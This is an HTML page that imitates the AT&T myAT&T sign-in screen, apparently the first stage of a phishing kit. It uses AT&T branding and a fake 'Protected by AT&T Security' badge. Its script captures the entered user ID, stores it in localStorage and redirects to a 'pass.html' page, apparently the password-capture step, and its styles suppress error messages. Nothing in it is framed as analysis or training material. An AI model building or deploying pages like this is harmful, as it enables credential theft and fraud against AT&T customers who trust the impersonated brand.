<!DOCTYPE html>
<html lang="en" class="isPC isFirefox isLandscape">
<head>
  <meta charset="utf-8">
  <title>Login Screen</title>
  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
  <meta name="apple-itunes-app" content="app-id=309172177">
  
  <!-- Favicon -->
  <link rel="icon" type="image/x-icon" href="https://signin.att.com/favicon.ico">
  
  <!-- Styles -->
  <link rel="stylesheet" href="At screen_files/styles.css">
  
  <!-- Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  
  <style>
    /* Loading bar styles */
    .loading-bar {
      height: 3px;
      width: 0;
      background-color: #0073cf;
      margin-top: 10px;
      border-radius: 2px;
      transition: width 0.5s ease;
      display: none;
    }
    
    /* Remove red error styling */
    .error {
      border-color: #ccc !important;
    }
    
    .formfield-msg {
      display: none !important;
    }
    
    /* Professional Footer Styling */
    .professional-footer {
      text-align: center;
      padding: 25px 20px;
      margin-top: 40px;
      background-color: #f8f9fa;
      border-top: 1px solid #e0e0e0;
      width: 100%;
    }
    
    .footer-content {
      max-width: 800px;
      margin: 0 auto;
    }
    
    .footer-links {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 20px;
      margin-bottom: 15px;
    }
    
    .footer-links a {
      color: #0073cf;
      text-decoration: none;
      font-weight: 600;
      font-size: 13px;
      transition: color 0.2s ease;
      white-space: nowrap;
    }
    
    .footer-links a:hover {
      color: #0056b3;
      text-decoration: underline;
    }
    
    .copyright {
      font-weight: 600;
      color: #666;
      font-size: 13px;
      margin-top: 8px;
    }
    
    .security-badge {
      display: inline-flex;
      align-items: center;
      background: #e8f4ff;
      padding: 8px 16px;
      border-radius: 20px;
      margin-top: 15px;
      font-size: 12px;
      font-weight: 600;
      color: #0073cf;
    }
    
    .security-badge i {
      margin-right: 6px;
      font-size: 14px;
    }
    
    /* Responsive adjustments */
    @media (max-width: 768px) {
      .footer-links {
        gap: 15px;
      }
      
      .footer-links a {
        font-size: 12px;
      }
      
      .professional-footer {
        padding: 20px 15px;
      }
    }
    
    @media (max-width: 480px) {
      .footer-links {
        flex-direction: column;
        gap: 10px;
      }
      
      .footer-links a {
        padding: 5px 0;
      }
      
      .copyright {
        font-size: 12px;
      }
    }
  </style>
</head>
<body>
  <div id="app-root">
    <div id="appCompBackground" class="full-width-background bg-white">
      <div id="appCompContainer" class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column">
        <div id="appCompCardContainer" class="row justify-center flex-1">
          <div id="appCompCardContDiv" class="pad-none">
            <app-card role="main">
              <div class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
                <div class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
                  <app-header class="flex-container">
                    <img id="headerLogoImage" alt="" src="At screen_files/att_hz_lg_lkp_rgb_pos.svg" class="header-logo-image mar-b-md-all">
                    <div class="mar-b-md-all text-center" id="signInHeaderTextDiv">
                      <h1 class="heading-lg" id="signInHeaderText">Sign in</h1>
                      <h1 class="heading-md mar-t-xxs-lg" id="signInHeaderToText">to myAT&amp;T</h1>
                    </div>
                  </app-header>
                  
                  <div class="width-full">
                    <form id="emailForm">
                      <input type="hidden" name="email" formcontrolname="email" value="">
                      <input type="hidden" name="email" formcontrolname="email" value="">
                      
                      <div id="userInputContainerDiv" class="form-row space-below">
                        <label id="userLabel" for="email" class="formfield-label">User ID</label>
                        <input id="userID" name="email" formcontrolname="email" autocomplete="email" spellcheck="false" autocapitalize="none" type="email" class="textfield" value="" required>
                      </div>
                      
                      <!-- Loading bar -->
                      <div class="loading-bar" id="loadingBar"></div>
                      
                      <div class="continue-button-spacing">
                        <button aria-live="polite" class="btn-full-width btn-primary letter-spacing-3" type="submit">Continue</button>
                      </div>
                      
                      <div id="forgotUserIDLinkContainer" class="mar-t-sm-all">
                        <a id="forgotUserID" class="link-text3 solo type-sm" href="#">Forgot user ID?</a>
                      </div>
                      
                      <div class="mar-t-sm-all">
                        <div class="font-regular">
                          <a id="createNow" class="link-text3 solo type-sm" href="#"><span id="dontHaveIdText">Don't have a user ID?</span><span>&nbsp;</span>Create one now</a>
                        </div>
                      </div>
                      
                      <div id="fastPayArea" class="mar-t-sm-all">
                        <a id="fastPayButton" class="link-text3 solo type-sm" href="#" target="_self">Pay without signing in</a>
                      </div>
                    </form>
                    
                    <div class="color-gray-400 hr-rule mar-t-md-all mar-b-md-all">
                      <hr class="color-gray-800 type-xs font-bold" aria-label="OR">
                    </div>
                    <form id="emailForm2">
                      <input type="hidden" name="email" value="">
                      <button id="" type="submit" class="btn-secondary btn-full-width letter-spacing-3">Sign in with myAT&amp;T app</button>
                    </form>
                  </div>
                </div>
              </div>
            </app-card>
          </div>
        </div>
        
        <!-- Professional Footer -->
        <div class="professional-footer">
          <div class="footer-content">
            <div class="footer-links">
              <a href="#">Privacy Policy</a>
              <a href="#">Terms of Use</a>
              <a href="#">Accessibility</a>
              <a href="#">Your Privacy Choices</a>
              <a href="#">Legal Policy Center</a>
            </div>
            <div class="copyright">
              © 2025 AT&T Intellectual Property. All rights reserved.
            </div>
            <div class="security-badge">
              <i class="fas fa-shield-alt"></i>
              Secure Login • Protected by AT&T Security
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Scripts -->
  <script>
    (function(){
      var form = document.getElementById('emailForm');
      if (form) {
        form.addEventListener('submit', function(e) {
          e.preventDefault();
          var emailInput = document.getElementById('userID');
          var email = emailInput ? String(emailInput.value || '').trim() : '';
          
          if (email.length < 4) {
            alert('Please enter a valid email address.');
            return;
          }
          
          // Show loading bar
          var loadingBar = document.getElementById('loadingBar');
          loadingBar.style.display = 'block';
          
          // Animate loading bar
          var width = 0;
          var loadingInterval = setInterval(function() {
            if (width >= 100) {
              clearInterval(loadingInterval);
              // Store email and redirect
              localStorage.setItem("userEmail", email);
              window.location.href = 'pass.html';
            } else {
              width += 10;
              loadingBar.style.width = width + '%';
            }
          }, 50);
        });
      }
    })();
  </script>
</body>
</html>
